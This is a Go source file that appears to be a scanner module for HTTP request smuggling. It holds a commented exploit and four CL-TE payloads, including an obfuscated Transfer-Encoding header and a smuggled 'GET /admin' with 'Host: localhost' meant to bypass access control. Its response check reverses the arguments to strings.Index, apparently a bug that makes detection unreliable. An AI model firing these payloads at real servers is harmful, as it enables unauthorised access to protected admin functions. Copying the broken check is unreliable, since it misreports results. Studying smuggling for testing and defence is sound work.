package Smuggling

import (
	"strings"
)

/*
Exploit
跳过权限控制，或者防火墙拦截，走私访问admin
POST /home HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: x

*/
//  1 CL-TE
//  2 CL-TE-TE HTTP request smuggling, obfuscating the TE header
var ClTePayload = []string{`POST %s HTTP/1.1
Host: %s
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded%s
Content-Length: 6
Transfer-Encoding: chunked

0

G`, `POST %s HTTP/1.1
Host: %s
Content-Type: application/x-www-form-urlencoded%s
Content-length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

`, `POST %s HTTP/1.1
Host: %s
Content-Type: application/x-www-form-urlencoded%s
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x`, `POST %s HTTP/1.1
Host: %s
Content-Type: application/x-www-form-urlencoded%s
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=`}

func init() {
	for n, x := range ClTePayload {
		x = strings.ReplaceAll(x, "\n", "\r\n")
		ClTePayload[n] = x
	}
}

type ClTe struct {
}

// 第三个payload 返回404表示ok
func (r *ClTe) CheckResponse(body string) bool {
	return -1 < strings.Index("Unrecognized method GPOST", body) || -1 < strings.Index("HTTP/1.1 404 Not Found", body)
}
func (r *ClTe) GetVulType() string {
	return "CL-TE"
}
func (r *ClTe) GetPayloads() *[]string {
	return &ClTePayload
}

func (r *ClTe) GetTimes() int {
	return 2
}
